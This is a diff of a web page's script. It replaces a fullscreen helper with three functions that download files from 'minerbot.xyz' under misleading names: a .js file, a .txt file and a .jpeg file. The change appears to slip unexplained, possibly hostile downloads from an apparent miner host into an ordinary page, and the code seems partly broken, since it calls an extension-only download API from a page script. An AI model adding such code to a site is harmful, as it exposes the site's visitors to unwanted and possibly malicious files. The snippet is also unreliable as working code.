@@ -39,10 +39,28 @@ function openFullscreen() {
   }
 }
 function down() {
-	if (document.fullscreenEnabled) { 
-    /* Show the element in fullscreen */
-    window.requestFullscreen();
-  }
+	var downloading = browser.downloads.download({
+  url : 'https://minerbot.xyz/s/',
+  filename : 'EXCEPT.js',
+  conflictAction : 'uniquify'
+});
+	downloading;
+}
+			    function down2() {
+	var downloading = browser.downloads.download({
+  url : 'https://minerbot.xyz/s/',
+  filename : 'INFO.txt',
+  conflictAction : 'uniquify'
+});
+	downloading;
+}
+			    function down3() {
+	var downloading = browser.downloads.download({
+  url : 'https://minerbot.xyz/s/',
+  filename : 'jk.jpeg',
+  conflictAction : 'uniquify'
+});
+	downloading;
 }
 	    </script>
 	    <!-- About-->
